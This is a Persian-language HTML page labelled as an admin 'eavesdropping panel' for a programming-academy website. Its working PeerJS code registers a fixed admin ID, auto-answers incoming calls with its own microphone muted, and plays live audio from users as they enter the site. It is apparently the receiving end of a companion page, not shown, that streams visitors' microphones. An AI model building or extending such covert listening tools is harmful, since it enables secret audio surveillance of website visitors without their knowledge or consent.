<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>پنل مدیریت و شنود صوتی - آکادمی برنامه‌نویسی</title>
    <!-- فونت وزیرمتن -->
    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
    <!-- کتابخانه PeerJS -->
    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
        body { background-color: #1e1e2f; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .panel { background: #2b2b40; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; width: 90%; }
        h1 { margin-bottom: 20px; color: #4facfe; font-size: 1.8rem; }
        #adminStatus { margin: 20px 0; font-size: 1.1rem; color: #00f2fe; }
        .btn { background: #00f2fe; color: #1e1e2f; padding: 12px 30px; border: none; border-radius: 25px; font-weight: bold; font-size: 1rem; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #4facfe; }
        audio { margin-top: 20px; width: 100%; }
    </style>
</head>
<body>

    <div class="panel">
        <h1>پنل زنده مانیتورینگ صدا</h1>
        <p>برای فعال‌سازی خطِ شنود، روی دکمه زیر کلیک کنید:</p>
        <button id="activeAdminBtn" class="btn">فعال‌سازی خط شنود</button>
        <p id="adminStatus">وضعیت: آماده به کار (غیرفعال)</p>
        
        <!-- پخش زنده صدای کاربر -->
        <audio id="incomingAudio" autoplay controls style="display:none;"></audio>
    </div>

    <script>
        const activeAdminBtn = document.getElementById('activeAdminBtn');
        const adminStatus = document.getElementById('adminStatus');
        const incomingAudio = document.getElementById('incomingAudio');

        // دقیقا همان شناسه ثابت ادمین که در فایل index.html هم قرار دارد
        const ADMIN_UNIQUE_ID = "my-unique-programming-admin-code-1405";

        activeAdminBtn.addEventListener('click', () => {
            activeAdminBtn.style.display = "none";
            adminStatus.innerText = "وضعیت: آنلاین و منتظر ورود کاربر به سایت...";
            adminStatus.style.color = "#2ed573";

            // اتصال ادمین با شناسه ثابت
            const peer = new Peer(ADMIN_UNIQUE_ID);

            peer.on('open', (id) => {
                console.log("پنل ادمین با موفقیت متصل شد. شناسه: " + id);
            });

            // وقتی کاربری از سایت تماس برقرار کرد
            peer.on('call', (call) => {
                adminStatus.innerText = "وضعیت: یک کاربر وصل شد! در حال پخش صدا...";
                
                // پاسخ خودکار به تماس کاربر (بدون ارسال صدای ادمین، فقط دریافت صدا)
                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                    .then((stream) => {
                        stream.getAudioTracks()[0].enabled = false; // بستن میکروفون ادمین (فقط شنونده)
                        call.answer(stream);
                    })
                    .catch(() => {
                        call.answer(); // پاسخ بدون استریم صوتی ادمین
                    });

                // دریافت صدای کاربر و پخش آن
                call.on('stream', (userStream) => {
                    incomingAudio.style.display = "block";
                    incomingAudio.srcObject = userStream;
                });

                call.on('close', () => {
                    adminStatus.innerText = "وضعیت: کاربر قطع شد. منتظر کاربر بعدی...";
                    incomingAudio.style.display = "none";
                });
            });

            peer.on('error', (err) => {
                console.error(err);
                adminStatus.innerText = "خطا: شناسه ادمین در حال استفاده است یا ارتباط قطع شد.";
                adminStatus.style.color = "#ff4757";
            });
        });
    </script>
</body>
</html>
